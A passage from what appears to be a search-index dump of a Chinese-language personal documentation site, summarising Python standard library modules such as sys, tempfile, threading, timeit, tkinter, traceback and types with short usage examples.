\"surrogateescape\" 错误处理方案对它们进行解码。当需要原始字节时，可以通过 [os.fsencode(arg) for arg in sys.argv] 来获取。 sys.base_exec_prefix 官网说的有点复杂. 实际就是虚拟环境目录 sys.base_prefix 一般与上一个一致. sys.byteorder 本地字节顺序的指示符。 在大端序（最高有效位优先）操作系统上值为 'big' ，\n在小端序（最低有效位优先）操作系统上为 'little' sys.executable: str 提供 Python 解释器的可执行二进制文件的绝对路径，仅在部分系统中此值有意义。\n如果 Python 无法获取其可执行文件的真实路径，则 sys.executable 将为空字符串或 None。 sys.modules 这是一个字典，它将模块名称映射到已经被加载的模块。\n这可以被操纵来强制重新加载模块和其他技巧。\n然而，替换这个字典不一定会像预期的那样工作，从字典中删除重要的项目可能会导致 Python 出错。\n如果你想对这个全局字典进行迭代，一定要使用 sys.modules.copy() 或 tuple(sys.modules) 来避免异常，\n因为它的大小在迭代过程中可能会因为其他线程中的代码或活动的副作用而改变。 sys.orig_argv 传给 Python 可执行文件的原始命令行参数列表。 sys.path 一个由字符串组成的列表，用于指定模块的搜索路径。\n初始化自环境变量 PYTHONPATH，再加上一条与安装有关的默认路径。 sys.platform 本字符串是一个平台标识符. 对于 Unix 系统（除 Linux 和 AIX 外），该字符串是 Python 构建时的 uname -s 返回的小写操作系统名称，\n并附加了 uname -r 返回的系统版本的第一部分，如 'sunos5' 或 'freebsd8' 对于其他系统: 系统 平台值 AIX 'aix' Emscripten 'emscripten' Linux 'linux' WASI 'wasi' Windows 'win32' Windows/Cygwin 'cygwin' macOS 'darwin' sys.platlibdir 平台专用库目录。用于构建标准库的路径和已安装扩展模块的路径。 在大多数平台上，它等同于 \"lib\" sys.stdin;sys.stdout;sys.stderr 解释器用于标准输入、标准输出和标准错误的 文件对象 sys.version 一个包含 Python 解释器版本号加编译版本号以及所用编译器等额外信息的字符串。 请不要从中提取版本信息，而应当使用 version_info 以及 platform 模块所提供的函数。 sys.api_version 这个解释器的 C API 版本。当你在调试 Python及期扩展模板的版本冲突这个功能非常有用。 sys.version_info 一个包含版本号五部分的元组: major, minor, micro, releaselevel 和 serial。\n除 releaselevel 外的所有值均为整数；发布级别值则为 'alpha', 'beta', 'candidate' 或 'final'。\n对应于 Python 版本 2.0 的 version_info 值为 (2, 0, 0, 'final', 0)。\n这些部分也可按名称访问，因此 sys.version_info[0] 就等价于 sys.version_info.major，依此类推。 在 3.1 版更改: 增加了以名称表示的各部分属性。 sys.maxsize 一个整数，表示 Py_ssize_t 类型的变量可以取到的最大值。 在 32 位平台上通常为 2**31 - 1，在 64 位平台上通常为 2**63 - 1。 sys.maxunicode 一个整数，表示最大的 Unicode 码点值，如 1114111 （十六进制为 0x10FFFF ）。 在 3.3 版更改: 在 PEP 393 之前，sys.maxunicode 曾是 0xFFFF 或 0x10FFFF，\n具体取决于配置选项，该选项指定将 Unicode 字符存储为 UCS-2 还是 UCS-4。 函数 sys._clear_type_cache() 清除内部的类型缓存。类型缓存是为了加速查找方法和属性的。在调试引用泄漏的时候调用这个函数 只会 清除不必要的引用。 这个函数应该只在内部为了一些特定的目的使用。 sys.exit([arg]) 引发一个 SystemExit 异常，表示打算退出解释器。 arg 默认为 0. 表示正常退出;\n非0整型, 表示异常终止. 大多数系统要求该值的范围是 0-127，否则会产生不确定的结果。\n某些系统为退出代码约定了特定的含义，但通常尚不完善； Unix 程序通常用 2 表示命令行语法错误，\n用 1 表示所有其他类型的错误。 传入其他类型的对象: 如果传入 None 等同于传入 0， 如果传入其他对象则将其打印至 stderr，且退出代码为 1 特别地，sys.exit(\"some error message\") 可以在发生错误时快速退出程序。 由于 exit() 最终 \"只\" 引发了一个异常，它只在从主线程调用时退出进程，而异常不会被拦截。\ntry 语句的 finally 子句所指定的清理动作会被遵守，并且有可能在外层拦截退出的尝试。 在 3.6 版更改: 在 Python 解释器捕获 SystemExit 后，如果在清理中发生错误（如清除标准流中的缓冲数据时出错），则退出状态码将变为 120。 sys.getallocatedblocks() 返回解释器当前已分配的内存块数，无论它们大小如何。本\n函数主要用于跟踪和调试内存泄漏。\n因为解释器有内部缓存，所以不同调用之间结果会变化。\n可能需要调用 _clear_type_cache() 和 gc.collect() 使结果更容易预测。 如果当前 Python 构建或实现无法合理地计算此信息，允许 getallocatedblocks() 返回 0。 3.4 新版功能. sys.getdefaultencoding() 返回当前 Unicode 实现所使用的默认字符串编码名称。 sys.getdlopenflags() 返回当前 dlopen() 调用所使用的标志位的值。\n标志值对应的符号名称可以在 os 模块中找到（形如 RTLD_xxx 的常量，如 os.RTLD_LAZY ）。 可用性: Unix。 sys.getfilesystemencoding()\n获取 文件系统编码格式: 与 文件系统错误处理句柄 一起使用以便在 Unicode 文件名和字节文件名之间进行转换。\n文件系统错误处理句柄是由 getfilesystemencoding() 来返回的。 为获得最佳兼容性，在任何时候都应使用 str 来表示文件名，尽管使用 bytes 来表示文件名也是受支持的。\n接受还返回文件名的函数应当支持 str 或 bytes 并在内部将其转换为系统首选的表示形式。 sys.getrecursionlimit() 返回当前的递归限制值，即 Python 解释器堆栈的最大深度。\n此限制可防止无限递归导致的 C 堆栈溢出和 Python 崩溃。 该值可以通过 setrecursionlimit() 设置。 sys.getsizeof(object[, default]) 返回对象的大小（以字节为单位）。\n该对象可以是任何类型。\n所有内建对象返回的结果都是正确的，但对于第三方扩展不一定正确，因为这与具体实现有关。 只计算直接分配给对象的内存消耗，不计算它所引用的对象的内存消耗。 对象不提供计算大小的方法时，如果传入过 default 则返回它，否则抛出 TypeError 异常。 如果对象由垃圾回收器管理，则 getsizeof() 将调用对象的 __sizeof__ 方法，并在上层添加额外的垃圾回收器。 可以参考 recursive sizeof recipe 中的示例，关于递归调用 getsizeof() 来得到各个容器及其所有内容物的大小。 sys.gettrace() 返回由 settrace() 设置的跟踪函数。 CPython 实现细节： gettrace() 函数仅用于实现调试器，性能分析器，打包工具等。\n它的行为是实现平台的一部分，而不是语言定义的一部分，因此并非在所有 Python 实现中都可用。 sys._getframe([depth]) 返回来自调用栈的一个帧对象。如果传入可选整数 depth，则返回从栈顶往下相应调用层数的帧对象。\n如果该数比调用栈更深，则抛出 ValueError。depth 的默认值是 0，返回调用栈顶部的帧。 Raises an auditing event sys._getframe with argument frame. CPython 实现细节： 这个函数应该只在内部为了一些特定的目的使用。不保证它在所有 Python 实现中都存在。 通过: sys._getframe([depth]).f_locals 获取此栈局部变量","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-sys.html","loc":"/yq-docs-rear-end-python-python-standard-library-sys.html"},{"title":"tarfile","text":"官网: https://docs.python.org/zh-cn/3/library/tarfile.html 读写tar归档文件, 包括使用 gzip, bz2 和 lzma 压缩的归档 常用: with tarfile.open('xxx.tar.gz', 'r:gz') as tar:\n  tar.extractall(path='./data_dir')","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-tarfile.html","loc":"/yq-docs-rear-end-python-python-standard-library-tarfile.html"},{"title":"tempfile","text":"tempfile --- 生成临时文件和目录 官网: https://docs.python.org/zh-cn/3/library/tempfile.html 该模块用于创建临时文件和目录，它可以跨平台使用。 TemporaryFile、NamedTemporaryFile、TemporaryDirectory 和 SpooledTemporaryFile\n是带有自动清理功能的高级接口，可用作上下文管理器。 mkstemp() 和 mkdtemp() 是低级函数，使用完毕需手动清理。 tempfile.TemporaryFile(mode='w+b', buffering=- 1, encoding=None, newline=None, suffix=None, prefix=None, dir=None, *, errors=None) 返回一个 file-like object （文件类对象）作为临时存储区域。\n创建该文件使用了与 mkstemp() 相同的安全规则。\n它将在关闭后立即销毁（包括垃圾回收机制关闭该对象时）。\n在 Unix 下，该文件在目录中的条目根本不创建，或者创建文件后立即就被删除了，其他平台不支持此功能。\n您的代码不应依赖使用此功能创建的临时文件名称，因为它在文件系统中的名称可能是可见的，也可能是不可见的。 mode = 'w+b' 创建的文件不用关闭，就可以读取或写入。\n因为用的是二进制模式，所以无论存的是什么数据，它在所有平台上都表现一致。 在 POSIX 平台上，它返回的对象是真实的文件对象。\n在其他平台上，它是一个文件类对象 (file-like object)，它的 file 属性是底层的真实文件对象。 如果可用，则使用 os.O_TMPFILE 标志（仅限于 Linux，需要 3.11 及更高版本的内核）。 在 Posix 或 Cygwin 以外的平台上，TemporaryFile 是 NamedTemporaryFile 的别名。 tempfile.NamedTemporaryFile(mode='w+b', buffering=- 1, encoding=None, newline=None, suffix=None, prefix=None, dir=None, delete=True, *, errors=None) 与上一个基本一致, 不过多了参数 delete 控制结束时是否删除文件 可以通过返回对象的name属性获取文件名. class tempfile.TemporaryDirectory(suffix=None, prefix=None, dir=None, ignore_cleanup_errors=False) 创建临时目录, 返回对象的 name 属性中找到临时目录的名称 这个类会使用与 mkdtemp() 相同的规则安全地创建一个临时目录。\n在完成上下文或销毁临时目录对象时，新创建的临时目录及其所有内容会从文件系统中被移除。 此目录可通过调用 cleanup() 方法来显式地清理。\n如果 ignore_cleanup_errors 为真值，\n则在显式或隐式清理（例如在 Windows 上 PermissionError 移除打开的文件）期间出现的未处理异常将被忽略，\n并且剩余的可移除条目会被\"尽可能\"地删除。\n在其他情况下，错误将在任何上下文清理发生时被引发 (cleanup() 调用、退出上下文管理器、对象被作为垃圾回收或解释器关闭等)。 tempfile.mkstemp(suffix=None, prefix=None, dir=None, text=False) 以最安全的方式创建一个临时文件。\n假设所在平台正确实现了 os.open() 的 os.O_EXCL 标志，则创建文件时不会有竞争的情况。\n该文件只能由创建者读写，如果所在平台用权限位来标记文件是否可执行，那么没有人有执行权。文件描述符不会过继给子进程。 与 TemporaryFile() 不同，mkstemp() 用户用完临时文件后需要自行将其删除。 suffix: 不是 None 则文件名将以该后缀结尾，是 None 则没有后缀。\nmkstemp() 不会在文件名和后缀之间加点，如果需要加一个点号，请将其放在 suffix 的开头。 prefix: 不是 None，则文件名将以该前缀开头，是 None 则使用默认前缀。\n默认前缀是 gettempprefix() 或 gettempprefixb() 函数的返回值（自动调用合适的函数）。 dir: 不为 None，则在指定的目录创建文件，是 None 则使用默认目录。\n默认目录是从一个列表中选择出来的，这个列表不同平台不一样，但是用户可以设置 TMPDIR、TEMP 或 TMP 环境变量来设置目录的位置。\n因此，不能保证生成的临时文件路径很规范，比如，通过 os.popen() 将路径传递给外部命令时仍需要加引号。 如果 suffix、prefix 和 dir 中的任何一个不是 None，就要保证它们是同一数据类型。\n如果它们是 bytes，则返回的名称的类型就是 bytes 而不是 str。\n如果确实要用默认参数，但又想要返回值是 bytes 类型，请传入 suffix=b''。 text: 为真值，文件会以文本模式打开。 否则，文件（默认）会以二进制模式打开。 mkstemp() 返回一个元组，\n元组中第一个元素是句柄，它是一个系统级句柄，指向一个打开的文件（等同于 os.open() 的返回值），\n第二元素是该文件的绝对路径。 在 3.5 版更改: 现在，suffix、prefix 和 dir 可以以 bytes 类型按顺序提供，以获得 bytes 类型的返回值。\n之前只允许使用 str。suffix 和 prefix 现在可以接受 None，并且默认为 None 以使用合适的默认值。 在 3.6 版更改: dir 参数现在可接受一个路径类对象 (path-like object)。 tempfile.mkdtemp(suffix=None, prefix=None, dir=None) 以最安全的方式创建一个临时目录，创建该目录时不会有竞争的情况。该目录只能由创建者读取、写入和搜索。 mkdtemp() 用户用完临时目录后需要自行将其删除。 返回新目录的绝对路径。 在 3.5 版更改: 现在，suffix、prefix 和 dir 可以以 bytes 类型按顺序提供，以获得 bytes 类型的返回值。之前只允许使用 str。suffix 和 prefix 现在可以接受 None，并且默认为 None 以使用合适的默认值。 在 3.6 版更改: dir 参数现在可接受一个路径类对象 (path-like object)。 tempfile.gettempdir() 返回放置临时文件的目录的名称。这个方法的返回值就是本模块所有函数的 dir 参数的默认值。 Python 搜索标准目录列表，以找到调用者可以在其中创建文件的目录。这个列表是： TMPDIR 环境变量指向的目录。 TEMP 环境变量指向的目录。 TMP 环境变量指向的目录。 与平台相关的位置： 在 Windows 上，依次为 C:TEMP、C:TMP、TEMP 和 TMP。 在所有其他平台上，依次为 /tmp、/var/tmp 和 /usr/tmp。 不得已时，使用当前工作目录。\n搜索的结果会缓存起来，参见下面 tempdir 的描述。 在 3.10 版更改: 总是返回一个字符串。 在之前的版本中它会返回任意 tempdir 值而不考虑它的类型，只要它不为 None。 tempfile.gettempdirb() 与 gettempdir() 相同，但返回值为字节类型。 tempfile.gettempprefix() 返回用于创建临时文件的文件名前缀，它不包含目录部分。 tempfile.gettempprefixb() 与 gettempprefix() 相同，但返回值为字节类型。 本模块使用一个全局变量来存储由 gettempdir() 返回的临时文件使用的目录路径。\n它可被直接设置以覆盖选择过程，但不建议这样做。\n本模块中的所有函数都接受一个 dir 参数，它可被用于指定目录。\n这是不会通过改变全局 API 行为对其他无准备代码造成影响的推荐做法。 用例: import tempfile\n\n# create a temporary file and write some data to it\nfp = tempfile.TemporaryFile()\nfp.write(b'Hello world!')\n# read data from file\nfp.seek(0)\nfp.read()\nb'Hello world!'\n# close the file, it will be removed\nfp.close()\n\n# create a temporary file using a context manager\nwith tempfile.TemporaryFile() as fp:\n    fp.write(b'Hello world!')\n    fp.seek(0)\n    fp.read()\nb'Hello world!'\n>>>\n# file is now closed and removed\n\n# create a temporary directory using the context manager\nwith tempfile.TemporaryDirectory() as tmpdirname:\n    print('created temporary directory', tmpdirname)\n>>>\n# directory and contents have been removed","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-tempfile.html","loc":"/yq-docs-rear-end-python-python-standard-library-tempfile.html"},{"title":"threading模块","text":"官网文档:: threading threading.Thread的常见方法 run() 线程的主要执行体, 用于子类重写, 直接调用不会触发多线程 start() 启动新线程的方式, 开启一个新线程去执行run方法(实现多线程),\n每个定义的线程只能start一次, 如果调用多次，则会报RuntimeError错误 join(timeout=None) 阻塞当前线程, 等待子进程执行结束 setDaemon(True) 将线程设置为守护线程, 如果主线程退出, 那么子线程也退出(若需要等待则使用join) is_alive() 线程是否存活，返回True或者False。\n在线程的run()运行之后直到run()结束，该方法返回True。 threading.Condition(lock=None) 一个条件变量对象允许一个或多个线程等待，直到被另一个线程通知。\nlock参数必须是一个Lock对象或者RLock对象，\n并且会作为底层锁使用，默认使用RLock。 acquire(*args) 请求底层锁。此方法调用底层锁对应的方法和返回对应方法的返回值。 release() 释放底层锁。此方法调用底层所对应的方法，没有返回值。 wait(timeout=None) 释放锁，等待直到被通知（再获取锁）或者发生超时事件。\n如果线程在调用此方法时本身并没有锁（即线程首先得有锁），\n则会报RuntimeError错误。这个方法释放底层锁，然后阻塞线程，\n直到另一个线程中的同一个条件变量使用notify()或notify_all()唤醒，\n或者超时事件发生，一旦被唤醒或者超时，\n则会重新去获取锁并返回（成功返回True，否则返回False）。\ntimeout参数为浮点类型的秒数。\n在RLock中使用一次release方法，可能并不能释放锁，\n因为锁可能被acquire()了多次，但是在条件变量对象中，\n它调用了RLock类的内部方法，可以一次就完全释放锁，\n重新获取锁时也会重置锁的递归等级。 wait_for(predicate, timeout=None) 与wait方法相似，等待，直到条件计算为True，\n返回最后一次的predicate的返回值。\npredicate参数为一个返回值为布尔值的可调用对象。\n调用此方法的时候会先调用predicate对象，\n如果返回的就是True，则不会释放锁，直接往后执行。\n另一个线程通知后，在它释放锁时，\n才会触发wait_for方法等待事件，\n这时如果predicate结果为True，则尝试获取锁，\n获取成功后则继续往后执行，\n如果为False，则会一直阻塞下去。此方法如果忽略timeout参数，\n就相当于：while not predicate(): condition_lock.wait()。 notify(n=1) 唤醒一个等待这个条件的线程，\n如果调用这个方法的线程在没有获得锁的情况下调用这个方法，\n会报RuntimeError错误。\n默认唤醒一个线程，可以通过参数n设置唤醒n个正在等待这个条件变量的线程，\n如果没有线程在等待，调用这个方法不会发生任何事。\n如果等待的线程中正好有n个线程，那么这个方法可以准确的唤醒这n个线程，\n但是等待的线程超过指定的n个，有时候可能会唤醒超过n个的线程，\n所以依赖参数n是不安全的行为。 notify_all() 唤醒所有等待这个条件的线程。\n这个方法与notify()不同之处在于它唤醒所有线程，而不是特定n个。 默认为False(换而言之, 默认, 主线程,子线程互不影响) 同时个人建议设置为True, 可以保证对子线程的控制权, 否则可能会出现, 主线程结束后, 子线程成为孤儿进程, 被托管给系统的init进程, 直到完成后被回收 其他变量: name 线程的名称字符串，并没有什么实际含义，多个线程可以赋予相同的名称，\n初始值由初始化方法来设置。 ident 线程的标识符，如果线程还没有启动，\n则为None。ident是一个非零整数，\n参见threading.get_ident()函数。\n当线程结束后，它的ident可能被其他新创建的线程复用，\n当然就算该线程结束了，它的ident依旧是可用的。 daemon 表示该线程是否是守护线程，True或者False。设置一个线程的daemon必须在线程的start()方法之前，否则会报RuntimeError错误。这个值默认继承自创建它的线程，主线程默认是非守护线程的，所以在主线程中创建的线程默认都是非守护线程的，即daemon=False。 Lock() 互斥锁 获取一个互斥锁, 用于多线程时互斥访问. 不过会降低效率(类似写成了单任务) Semaphore() 信号量Semaphore 与 Lock()_ 的区别是, Semaphore 支持同时对多个使用. Semaphore 内部维护了一个计数器. 获取锁的时候, 计数器减一, 释放锁的时候加一 一些坑 __new__方法是支持多线程的，\n所以对于使用__new__实现的单例对象, 不存在多线程的线程安全问题,\n更详细的说明, 知识在 __new__内部的操作没有线程安全问题, 可以保证多线程环境下返回的都是同一个对象, 但是其他方法, 存在同时访问的对象, 该加锁还是要加锁 class Single(object):\n\n  \"\"\"\n      single instance, attention son class's __init__ will exec once\n  \"\"\"\n\n  __instance = None\n\n  def __new__(cls, *args, **kwargs):\n      if cls.__instance is None:\n          cls.__instance = super().__new__(cls, )\n      return cls.__instance\n\n\nif __name__ == '__main__':\n\n  class P(Single):\n      p = 0\n      # _instance = None\n\n      # @classmethod\n      # def instance(cls,):\n      #     if cls._instance is None:\n      #         cls._instance = cls()\n      #     return cls._instance\n\n      def __init__(self):\n          time.sleep(random.randint(0, 5))\n\n      def set_p(self):\n          self.p += 1\n          print(f'p={self.p}', )\n\n  def set_p():\n      time.sleep(random.randint(0, 5))\n      pp = P()\n      print(pp)\n      pp.set_p()\n\n  t_list = []\n  for _ in range(20):\n      t_list.append(threading.Thread(target=set_p))\n  for t in t_list:\n      t.start() 输出(某些顺序 kennel不一样): <__main__.P object at 0x1107de4c0>\np=1\n<__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0>\n\np=2\np=3\n<__main__.P object at 0x1107de4c0>\n<__main__.P object at 0x1107de4c0>\np=4\np=5\n<__main__.P object at 0x1107de4c0>\np=6\n<__main__.P object at 0x1107de4c0>\np=7\n<__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0>\np=8\n<__main__.P object at 0x1107de4c0>\np=9\n\np=10\n<__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0>\n<__main__.P object at 0x1107de4c0>\np=11<__main__.P object at 0x1107de4c0>\np=12\n<__main__.P object at 0x1107de4c0>\np=13\n\np=14\n\np=15\n<__main__.P object at 0x1107de4c0>\np=16\n<__main__.P object at 0x1107de4c0><__main__.P object at 0x1107de4c0>\np=17\n\np=18\n<__main__.P object at 0x1107de4c0>\np=19\n<__main__.P object at 0x1107de4c0>\np=20","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-threading.html","loc":"/yq-docs-rear-end-python-python-standard-library-threading.html"},{"title":"timeit","text":"官网: timeit --- 测量小代码片段的执行时间 此模块提供了一种简单的方法来计算一小段 Python 代码的耗时。\n它有 命令行接口 以及一个 可调用 方法。\n它避免了许多测量时间的常见陷阱。\n另见 Tim Peter 在 O'Reilly 出版的 Python Cookbook 第二版中\"算法\"章节的概述。 看语句的执行时间 如: print(timeit.timeit('set([x for x in [1, 3, 5]])'))\nprint(timeit.timeit('set(x for x in [1, 3, 5])')) 源码，主要有两个方法: def timeit(stmt=\"pass\", setup=\"pass\", timer=default_timer,\n          number=default_number, globals=None):\n    \"\"\"Convenience function to create Timer object and call timeit method.\"\"\"\n    return Timer(stmt, setup, timer, globals).timeit(number)\n\ndef repeat(stmt=\"pass\", setup=\"pass\", timer=default_timer,\n          repeat=default_repeat, number=default_number, globals=None):\n    \"\"\"Convenience function to create Timer object and call repeat method.\"\"\"\n    return Timer(stmt, setup, timer, globals).repeat(repeat, number) 参数解析： stmt  statement，需要计算的代码字符串。（本地测的时候，不支持外部的变量） setup statement的前置执行，比如可以在这里import或者定义变量 timer 默认是 default_timer = time.perf_counter ，使用的计时器 number        指定执行的次数，默认是1000000（3.6的源码默认是100w） globals       执行的命名空间 repeat        重复次数，3.6源码默认是3","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-timeit.html","loc":"/yq-docs-rear-end-python-python-standard-library-timeit.html"},{"title":"tkinter","text":"geometry的作用 设置窗口的宽和高，就算窗口已经通过resizable函数禁止调整宽高；\n还可以移动窗口在屏幕上的位置: root = tk.Tk()\n\n# 设置为禁止调整宽、高\nroot.resizable(0,0)\n\n# 大小设置为 600 x 600\nroot.geometry('600x600') 移动窗口位置, 加号风格, 第1个加号是距离屏幕左边的宽，\n第2个加号是距离屏幕顶部的高, 可为负数: root.geometry('+0+0')\nroot.geometry('+300+400')\n\n# 为负数移动到屏幕外, 可以隐藏窗口\nroot.geometry('+-3000+-4000')\n\n# 也可以一起设置\nroot.geometry('300x250+500+240') 参数为None,\n获取窗口位置: root.geometry(None)\n# '300x250+336+55' #### 布局管理器 grid、pack、place 参考: https://blog.csdn.net/Oh_Python/article/details/124196792 grid表格布局，采用表格结构组织组件，子组件的位置由行和列的单元格确定，并且可以跨行和跨列，从而实现复杂的布局。 pack按照组件的创建顺序将子组件添加到父组件中，按照垂直或者水平的方向自然排布，如果不指定任何选项，默认在父组件中自顶向下垂直添加组件。pack是代码量最少，最简单的一种，可以用于快速生成界面。 place 布局管理器可以通过坐标精确控制组件的位置，适用于一些布局更加灵活的场景。 ### other task.cancel() 只能取消状态为 pending的任务, 否则将毫无作用","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-tkinter.html","loc":"/yq-docs-rear-end-python-python-standard-library-tkinter.html"},{"title":"traceback","text":"写几个常用的吧暂时. traceback.print_tb(tb, limit=None, file=None) 如果 limit 是正整数，那么从 traceback 对象 \"tb\" 输出最高 limit 个（从调用函数开始的）栈的堆栈回溯条目；\n如果 limit 是负数就输出 abs(limit) 个回溯条目；\n又如果 limit 被省略或者为 None，那么就会输出所有回溯条目。 如果 file 被省略或为 None 那么就会输出至标准输出 sys.stderr 否则它应该是一个打开的文件或者文件类对象来接收输出 在 3.5 版更改: 添加了对负数值 limit 的支持 traceback.print_exception(exc, /, [value, tb, ]limit=None, file=None, chain=True) 打印回溯对象 tb 到 file 的异常信息和整个堆栈回溯。这和 print_tb() 比有以下方面不同： 如果 tb 不为 None，它将打印头部 Traceback (most recent call last):\n它将在栈回溯之后打印异常类型和 value\n如果 type(value) 为 SyntaxError 且 value 具有适当的格式，它会打印发生语法错误的行并用一个圆点来指明错误的大致位置。\n从 Python 3.10 开始，可以不再传递 value 和 tb，而是传递一个异常对象作为第一个参数。 如果提供了 value 和 tb，则第一个参数会被忽略以便提供向下兼容性。 可选的 limit 参数具有与 print_tb() 的相同含义。 如果 chain 为真值（默认），则链式异常（异常的 __cause__ 或 __context__ 属性）也将被打印出来，就像解释器本身在打印未处理的异常时一样。 在 3.5 版更改: etype 参数会被忽略并根据 value 推断出来。 在 3.10 版更改: etype 形参已被重命名为 exc 并且现在是仅限位置形参。 ttraceback.extract_tb(tb, limit=None) 返回一个 StackSummary 对象来代表从回溯对象 tb 提取的 \"预处理\" 栈回溯条目列表。\n它适用于栈回溯的替代格式化。\n可选的 limit 参数具有与 print_tb() 的相同含义。\n\"预处理\" 栈回溯条目是一个 FrameSummary 对象，其中包含代表通常为栈回溯打印的信息的 filename, lineno, name 和 line 等属性。\nline 是一个去除了前导和末尾空白符的字符串；如果源代码不可用则它将为 None。 ttraceback.extract_stack(f=None, limit=None) 从当前的栈帧提取原始回溯信息。\n返回值具有与 extract_tb() 的相同格式。\n可选的 f 和 limit 参数具有与 print_stack() 的相同含义。 ttraceback.format_list(extracted_list) 给定一个由元组或如 extract_tb() 或 extract_stack() 所返回的 FrameSummary 对象组成的列表，返回一个可打印的字符串列表。\n结果列表中的每个字符串都对应于参数列表中具有相同索引号的条目。\n每个字符串以一个换行符结束；对于那些源文本行不为 None 的条目，字符串也可能包含内部换行符。 traceback.print_exc(limit=None, file=None, chain=True) This is a shorthand for print_exception(sys.exception(), limit, file, chain). traceback.format_exc(limit=None, chain=True) 以字符串形式打印堆栈异常. 类似于 print_exc(limit) 但会返回一个字符串而不是打印到一个文件。 traceback.format_tb(tb, limit=None) 是 format_list(extract_tb(tb, limit)) 的简写形式。 traceback.format_stack(f=None, limit=None) 以字符串的形式打印堆栈调用. 是 format_list(extract_stack(f, limit)) 的简写形式。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-standard-library-traceback.html","loc":"/yq-docs-rear-end-python-python-standard-library-traceback.html"},{"title":"types","text":"types --- 动态类型创建和内置类型名称 官网: https://docs.python.org/zh-cn/3/library/types.html 此模块定义了一些工具函数，用于协助动态创建新的类型。 它还为某些对象类型定义了名称，这些名称由标准 Python 解释器所使用，但并不像内置的 int 或 str 那样对外公开。 最后，它还额外提供了一些类型相关但重要程度不足以作为内置对象的工具类和函数。 动态类型创建 types.new_class(name, bases=(), kwds=None, exec_body=None) 使用适当的元类动态地创建一个类对象。 前三个参数是组成类定义头的部件：类名称，基类 (有序排列)，关键字参数 (例如 metaclass)。 exec_body 参数是一个回调函数，用于填充新创建类的命名空间。\n它应当接受类命名空间作为其唯一的参数并使用类内容直接更新命名空间。\n如果未提供回调函数，则它就等效于传入 lambda ns: None。 3.3 新版功能. types.prepare_class(name, bases=(), kwds=None) 计算适当的元类并创建类命名空间。 参数是组成类定义头的部件：类名称，基类 (有序排列) 以及关键字参数 (例如 metaclass)。 返回值是一个 3 元组: metaclass, namespace, kwds metaclass 是适当的元类，namespace 是预备好的类命名空间而 kwds 是所传入 kwds 参数移除每个 'metaclass' 条目后的已更新副本。 如果未传入 kwds 参数，这将为一个空字典。 3.3 新版功能. 在 3.6 版更改: 所返回元组中 namespace 元素的默认值已被改变。 现在当元类没有 __prepare__ 方法时将会使用一个保留插入顺序的映射。 types.resolve_bases(bases) 动态地解析 MRO 条目 3.7 新版功能. 标准解释器类型 此模块为许多类型提供了实现 Python 解释器所要求的名称。\n它刻意地避免了包含某些仅在处理过程中偶然出现的类型，例如 listiterator 类型。 此种名称的典型应用如 isinstance() 或 issubclass() 检测。 如果你要实例化这些类型中的任何一种，请注意其签名在不同 Python 版本之间可能出现变化。 以下类型有相应的标准名称定义： types.NoneType None 的类型。 3.10 新版功能. types.FunctionType . types.LambdaType 用户自定义函数以及由 lambda 表达式所创建函数的类型。 引发一个 审计事件 function.__new__，附带参数 code。 此审计事件只会被函数对象的直接实例化引发，而不会被普通编译所引发。 types.GeneratorType generator 迭代器对象的类型，由生成器函数创建。 types.CoroutineType coroutine 对象的类型，由 async def 函数创建。 3.5 新版功能. types.AsyncGeneratorType asynchronous generator 迭代器对象的类型，由异步生成器函数创建。 3.6 新版功能. class types.CodeType(**kwargs) 代码对象的类型，例如 compile() 的返回值。 引发 审计事件 code.__new__ 附带参数 code, filename, name, argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize, flags。 请注意被审计的参数可能与初始化代码所要求的名称或位置不相匹配。 审计事件只会被代码对象的直接实例化引发，而不会被普通编译所引发。 replace(**kwargs) 返回代码对象的一个副本，使用指定的新字段值。 3.8 新版功能. types.CellType 单元对象的类型：这种对象被用作函数中自由变量的容器。 3.8 新版功能. types.MethodType 用户自定义类实例方法的类型。 types.BuiltinFunctionType . types.BuiltinMethodType 内置函数例如 len() 或 sys.exit() 以及内置类方法的类型。 （这里所说的\"内置\"是指\"以 C 语言编写\"。） types.WrapperDescriptorType 某些内置数据类型和基类的方法的类型，例如 object.__init__() 或 object.__lt__()。 types.MethodWrapperType 某些内置数据类型和基类的 绑定 方法的类型。 例如 object().__str__ 所属的类型。 types.NotImplementedType NotImplemented 的类型。 types.MethodDescriptorType 某些内置数据类型方法例如 str.join() 的类型。 types.ClassMethodDescriptorType 某些内置数据类型 非绑定 类方法例如 dict.__dict__['fromkeys'] 的类型。 class types.ModuleType(name, doc=None) 模块 的类型。 构造器接受待创建模块的名称并以其 docstring 作为可选参数。 备注: 如果你希望设置各种由导入控制的属性，请使用 importlib.util.module_from_spec() 来创建一个新模块。 __doc__ 模块的 docstring。 默认为 None。 __loader__ 用于加载模块的 loader。 默认为 None。 This attribute is to match importlib.machinery.ModuleSpec.\nloader as stored in the __spec__ object. 注解 未来的 Python 版本可能会停止默认设置此属性。\n为了避免这个潜在变化的影响，如果你明确地需要使用此属性则推荐改从 __spec__ 属性读取\n或是使用 getattr(module, \"__loader__\", None)。 在 3.4 版更改: 默认为 None。 之前该属性为可选项。 __name__ 模块的名称。 应当能匹配 importlib.machinery.ModuleSpec.name。 __package__ 一个模块所属的 package。\n如果模块为最高层级的（即不是任何特定包的组成部分）则该属性应设为 ''，\n否则它应设为特定包的名称 (如果模块本身也是一个包则名称可以为 __name__)。 默认为 None。 This attribute is to match importlib.machinery.ModuleSpec.parent as stored in the __spec__ object. 注解 未来的 Python 版本可能停止默认设置此属性。\n为了避免这个潜在变化的影响，如果你明确地需要使用此属性则推荐改从 __spec__ 属性读取或是使用 getattr(module, \"__package__\", None)。 在 3.4 版更改: 默认为 None。 之前该属性为可选项。 __spec__ 模块的导入系统相关状态的记录。 应当是一个 importlib.machinery.ModuleSpec 的实例。 types.EllipsisType Ellipsis 的类型。 class types.GenericAlias(t_origin, t_args) 形参化泛型 的类型，例如 list[int]。 t_origin 应当是一个非形参化的泛型类，例如 list, tuple 或 dict。\nt_args 应当是一个形参化 t_origin 的 tuple (长度可以为 1): >>>\nfrom types import 